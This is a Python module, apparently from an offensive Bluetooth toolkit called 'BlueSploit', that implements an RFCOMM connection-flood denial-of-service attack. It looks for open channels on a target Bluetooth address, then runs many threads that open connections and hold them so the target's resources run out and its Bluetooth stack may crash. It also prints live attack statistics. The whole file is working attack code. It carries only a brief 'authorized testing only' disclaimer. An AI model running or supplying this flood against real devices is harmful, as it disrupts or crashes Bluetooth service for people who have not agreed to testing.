"""
BlueSploit Module: RFCOMM Flood - Connection Exhaustion DoS
Bluetooth denial of service via RFCOMM channel flooding

Opens multiple RFCOMM connections to exhaust target's
connection pool and resources.

Author: v33ru
"""

import time
import threading
from typing import List
from core.base import (
    ExploitModule, ModuleInfo, ModuleOption,
    BTProtocol, Severity
)
from core.utils.printer import (
    print_success, print_error, print_info, print_warning, Colors
)

try:
    import bluetooth
    BLUETOOTH_AVAILABLE = True
except ImportError:
    BLUETOOTH_AVAILABLE = False


class Module(ExploitModule):
    """
    RFCOMM Flood - Connection Exhaustion DoS
    
    Rapidly opens and optionally holds RFCOMM connections to
    exhaust the target's Bluetooth resources. This can cause:
    - Connection pool exhaustion
    - Memory leak from connection state
    - Denial of service to legitimate connections
    - Bluetooth stack crashes
    
    DISCLAIMER: For authorized security testing only.
    """
    
    info = ModuleInfo(
        name="exploits/dos/classic/rfcomm_flood",
        description="RFCOMM Connection Exhaustion DoS Attack",
        author=["v33ru"],
        protocol=BTProtocol.CLASSIC,
        severity=Severity.MEDIUM,
        references=[
            "https://www.bluetooth.com/specifications/specs/core-specification/"
        ]
    )
    
    def _setup_options(self) -> None:
        self.options = {
            "target": ModuleOption(
                name="target",
                required=True,
                description="Target BD_ADDR (XX:XX:XX:XX:XX:XX)"
            ),
            "channel": ModuleOption(
                name="channel",
                required=False,
                description="RFCOMM channel (1-30, 0 = scan all)",
                default=0
            ),
            "threads": ModuleOption(
                name="threads",
                required=False,
                description="Number of concurrent threads",
                default=10
            ),
            "hold": ModuleOption(
                name="hold",
                required=False,
                description="Hold connections open (exhaustion mode)",
                default=True
            ),
            "duration": ModuleOption(
                name="duration",
                required=False,
                description="Attack duration in seconds (0 = until Ctrl+C)",
                default=60
            ),
            "timeout": ModuleOption(
                name="timeout",
                required=False,
                description="Connection timeout in seconds",
                default=5
            )
        }
    
    def _find_open_channels(self, target: str) -> List[int]:
        """Find open RFCOMM channels on target"""
        open_channels = []
        
        if BLUETOOTH_AVAILABLE:
            try:
                services = bluetooth.find_service(address=target)
                for svc in services:
                    port = svc.get("port")
                    if port and isinstance(port, int) and 1 <= port <= 30:
                        if port not in open_channels:
                            open_channels.append(port)
            except:
                pass
        
        # If no services found, try common channels
        if not open_channels:
            open_channels = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
        
        return sorted(open_channels)
    
    def _connect_thread(self, thread_id: int, target: str, channels: List[int],
                        hold: bool, timeout: int, stop_event: threading.Event,
                        stats: dict, held_sockets: List) -> None:
        """Worker thread for connection flooding"""
        channel_idx = thread_id % len(channels)
        
        while not stop_event.is_set():
            channel = channels[channel_idx % len(channels)]
            channel_idx += 1
            
            sock = None
            try:
                sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
                sock.settimeout(timeout)
                sock.connect((target, channel))
                
                stats["connected"] += 1
                stats["attempts"] += 1
                
                if hold:
                    # Keep socket open
                    held_sockets.append(sock)
                    sock = None  # Don't close
                else:
                    # Immediate disconnect (rapid churn)
                    sock.close()
                    sock = None
                    
            except (OSError, IOError) as e:
                stats["attempts"] += 1
                err_str = str(e).lower()
                if "connection refused" in err_str:
                    stats["refused"] += 1
                elif "timed out" in err_str:
                    stats["timeout"] += 1
                else:
                    stats["errors"] += 1
            except Exception:
                stats["attempts"] += 1
                stats["errors"] += 1
            finally:
                if sock:
                    try:
                        sock.close()
                    except:
                        pass
    
    def _print_results(self, target: str, stats: dict, held_count: int,
                       duration: float, success: bool) -> None:
        """Print attack results"""
        C = Colors
        aps = stats["attempts"] / duration if duration > 0 else 0
        
        print(f"\n  {C.CYAN}{'='*70}{C.RESET}")
        print(f"  {C.BOLD}{C.WHITE}RFCOMM FLOOD ATTACK RESULTS{C.RESET}")
        print(f"  {C.CYAN}{'='*70}{C.RESET}")
        print(f"  Target            : {C.WHITE}{target}{C.RESET}")
        print(f"  Connection Attempts: {C.YELLOW}{stats['attempts']}{C.RESET}")
        print(f"  Successful        : {C.GREEN}{stats['connected']}{C.RESET}")
        print(f"  Refused           : {stats['refused']}")
        print(f"  Timed Out         : {stats['timeout']}")
        print(f"  Errors            : {stats['errors']}")
        print(f"  Held Open         : {C.YELLOW}{held_count}{C.RESET}")
        print(f"  Duration          : {duration:.2f} seconds")
        print(f"  Rate              : {aps:.1f} attempts/sec")
        print(f"  Status            : {C.GREEN if success else C.RED}{'COMPLETED' if success else 'FAILED'}{C.RESET}")
        
        if held_count > 0:
            print(f"\n  {C.YELLOW}[*] {held_count} connections held - target resources exhausted{C.RESET}")
        if stats['refused'] > stats['connected']:
            print(f"\n  {C.YELLOW}[*] High refusal rate - target may be at connection limit{C.RESET}")
        
        print(f"\n  {C.CYAN}{'='*70}{C.RESET}\n")
    
    def run(self) -> bool:
        """Execute RFCOMM flood attack"""
        
        if not BLUETOOTH_AVAILABLE:
            print_error("PyBluez library not installed!")
            print_info("Try: pip install pybluez2")
            return False
        
        target = self.target
        channel = int(self.get_option("channel"))
        threads_count = int(self.get_option("threads"))
        hold = self.get_option("hold")
        duration = int(self.get_option("duration"))
        timeout = int(self.get_option("timeout"))
        
        # Validate
        if not self.validate_bd_addr(target):
            print_error(f"Invalid BD_ADDR: {target}")
            return False
        
        # Determine channels
        if channel == 0:
            print_info("Scanning for open RFCOMM channels...")
            channels = self._find_open_channels(target)
            print_info(f"Found channels: {channels}")
        else:
            channels = [channel]
        
        if not channels:
            print_error("No RFCOMM channels to target")
            return False
        
        # Print attack info
        C = Colors
        print(f"\n  {C.RED}╔{'═'*60}╗{C.RESET}")
        print(f"  {C.RED}║{C.RESET} {C.BOLD}RFCOMM Flood - Connection Exhaustion DoS{C.RESET}                   {C.RED}║{C.RESET}")
        print(f"  {C.RED}╚{'═'*60}╝{C.RESET}\n")
        
        print_info(f"Target      : {target}")
        print_info(f"Channels    : {channels}")
        print_info(f"Threads     : {threads_count}")
        print_info(f"Hold Mode   : {hold}")
        print_info(f"Duration    : {'infinite' if duration == 0 else f'{duration}s'}")
        
        print()
        print_warning("DISCLAIMER: For authorized security testing only!")
        print_info("Starting in 3 seconds... (Ctrl+C to stop)")
        
        try:
            time.sleep(3)
        except KeyboardInterrupt:
            print_warning("Cancelled")
            return False
        
        # Shared state
        stats = {
            "attempts": 0,
            "connected": 0,
            "refused": 0,
            "timeout": 0,
            "errors": 0
        }
        held_sockets: List = []
        stop_event = threading.Event()
        threads: List[threading.Thread] = []
        
        print_info(f"Starting {threads_count} flood threads...")
        start_time = time.time()
        
        try:
            # Start worker threads
            for i in range(threads_count):
                t = threading.Thread(
                    target=self._connect_thread,
                    args=(i, target, channels, hold, timeout, stop_event, stats, held_sockets),
                    daemon=True
                )
                t.start()
                threads.append(t)
            
            print_success(f"Flooding {target} RFCOMM channels...")
            
            # Monitor
            while True:
                elapsed = time.time() - start_time
                
                if duration > 0 and elapsed >= duration:
                    break
                
                aps = stats["attempts"] / elapsed if elapsed > 0 else 0
                held = len(held_sockets)
                
                status = f"Attempts: {stats['attempts']} | Connected: {stats['connected']} | Held: {held} | Rate: {aps:.1f}/s"
                
                if duration > 0:
                    remaining = duration - elapsed
                    print(f"\r  {C.CYAN}[{status} | {remaining:.0f}s left]{C.RESET}    ", end='', flush=True)
                else:
                    print(f"\r  {C.CYAN}[{status} | {elapsed:.0f}s]{C.RESET}    ", end='', flush=True)
                
                time.sleep(1)
                
        except KeyboardInterrupt:
            print()
            print_warning("Interrupted by user")
        finally:
            stop_event.set()
            print_info("Stopping threads...")
            
            for t in threads:
                t.join(timeout=2)
            
            # Close held sockets
            print_info(f"Closing {len(held_sockets)} held connections...")
            for sock in held_sockets:
                try:
                    sock.close()
                except:
                    pass
        
        actual_duration = time.time() - start_time
        self._print_results(target, stats, len(held_sockets), actual_duration, stats["attempts"] > 0)
        
        self.add_result({
            "target": target,
            "attempts": stats["attempts"],
            "connected": stats["connected"],
            "held": len(held_sockets),
            "duration": actual_duration
        })
        
        return stats["attempts"] > 0
